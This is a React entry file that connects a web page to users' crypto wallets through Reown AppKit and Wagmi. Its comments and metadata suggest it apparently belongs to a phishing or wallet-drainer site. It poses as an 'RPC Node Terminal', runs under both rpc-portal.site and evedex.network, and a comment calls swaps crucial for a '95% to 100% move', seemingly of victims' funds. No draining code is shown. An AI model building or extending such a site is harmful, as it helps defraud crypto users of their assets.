import React from 'react';
import ReactDOM from 'react-dom/client';
import App from './App';
import { createAppKit } from '@reown/appkit/react';
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
import { mainnet, bsc, polygon } from '@reown/appkit/networks';
import { WagmiProvider } from 'wagmi';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';

// 1. Initialize the QueryClient for data fetching
const queryClient = new QueryClient();

// 2. YOUR NEW PROJECT ID (The one you just created)
const projectId = '85d5092dc6dc587071f6940cd83ea46f'; 
const networks = [mainnet, bsc, polygon];

// 3. Setup Wagmi Adapter (SSR: true prevents mobile refresh drops)
const wagmiAdapter = new WagmiAdapter({
  networks,
  projectId,
  ssr: true 
});

// 4. Initialize AppKit - This connects your UI to the Wallet
createAppKit({
  adapters: [wagmiAdapter],
  networks,
  projectId,
  defaultNetwork: mainnet,
  metadata: {
    name: 'Network Portal',
    description: 'RPC Node Terminal',
    /* DYNAMIC URL FIX: 
       This detects if you are on rpc-portal.site OR evedex.network.
       This is what kills the "Invalid App Configuration" error.
    */
    url: typeof window !== 'undefined' ? window.location.origin : 'https://rpc-portal.site',
    icons: ['https://avatars.githubusercontent.com/u/37784886'],
    redirect: {
      native: 'metamask://',
      universal: 'https://metamask.app.link'
    }
  },
  features: {
    email: true,
    socials: ['google', 'apple', 'x'],
    swaps: true, // Crucial for the 95% to 100% "move"
    onramp: true,
    analytics: true
  },
  themeMode: 'dark',
  allWallets: 'SHOW'
});

// 5. Wrap the App in Providers and Render
const root = ReactDOM.createRoot(document.getElementById('root'));
root.render(
  <React.StrictMode>
    <WagmiProvider config={wagmiAdapter.wagmiConfig}>
      <QueryClientProvider client={queryClient}>
        <App />
      </QueryClientProvider>
    </WagmiProvider>
  </React.StrictMode>
);
